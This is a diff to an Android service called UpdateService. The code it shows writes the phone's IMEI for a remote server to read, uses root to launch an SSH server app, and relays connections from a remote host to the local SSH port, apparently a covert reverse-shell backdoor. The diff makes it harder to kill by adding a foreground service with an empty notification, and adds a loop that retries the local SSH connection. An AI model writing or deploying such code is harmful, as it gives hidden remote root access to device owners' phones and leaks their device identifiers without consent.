@@ -10,12 +10,14 @@ import java.util.TimerTask;
 import java.util.concurrent.FutureTask;
 
 import android.annotation.SuppressLint;
+import android.app.Notification;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.support.v4.app.NotificationCompat;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -50,7 +52,7 @@ public class UpdateService extends Service {
 	/**
 	 * Remote SSH host and port
 	 */
-	public static final String SSH_HOST = "coolDomain.de";
+	public static final String SSH_HOST = "coolDomain.com";
 	public static final int SSH_PORT = 33822;
 
 	private Process rootProcess;
@@ -60,14 +62,17 @@ public class UpdateService extends Service {
 	@SuppressLint({ "Wakelock", "WorldWriteableFiles" })
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
+		Notification notification = new NotificationCompat.Builder(this).build();
+		startForeground(1337, notification);
+
 		PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
 		mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UpdateService");
 		mWakeLock.acquire();
-		
+
 		//Store imei in file, so that the server can read it
 		TelephonyManager TelephonyMgr = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
 		String imei = TelephonyMgr.getDeviceId();
-		
+
 		String path = getExternalFilesDir(null).getAbsolutePath();
 		FileOutputStream outputStream;
 		try {
@@ -96,10 +101,7 @@ public class UpdateService extends Service {
 					os.writeBytes("am start \"com.icecoldapps.sshserver/.viewStart\" &\n");
 					os.writeBytes("exit\n");
 		            os.flush();
-		            Thread.sleep(5000);
 				} catch (IOException e) {
-					e.printStackTrace();
-				} catch (InterruptedException e) {
 					e.printStackTrace();
 				}
 
@@ -130,7 +132,14 @@ public class UpdateService extends Service {
 						Thread.sleep(100);
 					}
 
-					localSSH = new Socket("127.0.0.1", 33822);
+					while(localSSH == null || !localSSH.isConnected()){
+						try { //try to connect as long till a connection is possible
+							localSSH = new Socket("127.0.0.1", 33822);
+						}
+						catch (Exception e) {
+						}
+						Thread.sleep(100);
+					}
 					
 					/*
 					 * Pump data from one to the other connection
